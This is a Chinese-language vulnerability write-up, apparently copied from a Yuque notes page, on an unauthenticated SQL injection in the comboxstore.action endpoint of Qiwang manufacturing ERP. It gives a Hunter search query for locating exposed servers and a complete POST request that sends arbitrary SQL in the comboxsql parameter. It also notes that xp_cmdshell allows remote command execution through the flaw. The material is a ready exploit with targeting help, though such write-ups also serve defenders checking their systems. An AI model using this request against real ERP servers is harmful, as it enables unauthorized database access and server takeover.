# 企望制造ERP comboxstore.action SQL注入漏洞

# 一、漏洞简介
企望制造eERP系统由深知纸箱行业特点和业务流程的多位IT专家打造，具有国际先进的管理方式，将现代化的管理方式融入erp软件中，让企业分分钟就拥有科学的管理经验。 erp的功能包括成本核算、报价定价、订单下达、生产下单、现场管理等多种功能。由于企望制造 ERP comboxstore.action接口权限设置不当，默认的配置可执行任意SQL语句，利用xp_cmdshell函数可远程执行命令，未经认证的攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 企望制造ERP系统

# 三、资产测绘
+ hunter`app.name="企望制造ERP"`
+ 登录页面

![1693910033825-52c78947-5989-4307-9115-aad9c9a3a87e.png](./img/g3JR0CDELSXnpqfr/1693910033825-52c78947-5989-4307-9115-aad9c9a3a87e-529920.png)

# 四、漏洞复现
1.访问`poc`出现如下页面表示存在漏洞

```plain
/mainFunctions/comboxstore.action
```

![1693910438559-36044b06-551f-4853-ac6d-8de9fbe97157.png](./img/g3JR0CDELSXnpqfr/1693910438559-36044b06-551f-4853-ac6d-8de9fbe97157-625317.png)

2. 执行SQL语句获取数据库版本

```plain
POST /mainFunctions/comboxstore.action HTTP/1.1
Host: xx.xx.xx.xx	
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=7256C68B9C89F11BE2F841C3F1CAA415
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

comboxsql=select%20@@version;
```

![1693910681210-3bb44a13-6f9c-450e-9a10-9309fa6f8cc2.png](./img/g3JR0CDELSXnpqfr/1693910681210-3bb44a13-6f9c-450e-9a10-9309fa6f8cc2-183096.png)

![1693911193284-eefe9f64-ead8-478a-ac99-b62baaa53d9f.png](./img/g3JR0CDELSXnpqfr/1693911193284-eefe9f64-ead8-478a-ac99-b62baaa53d9f-226165.png)



> 更新: 2024-02-29 23:55:50  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ry4xq0e8le5qgn5r>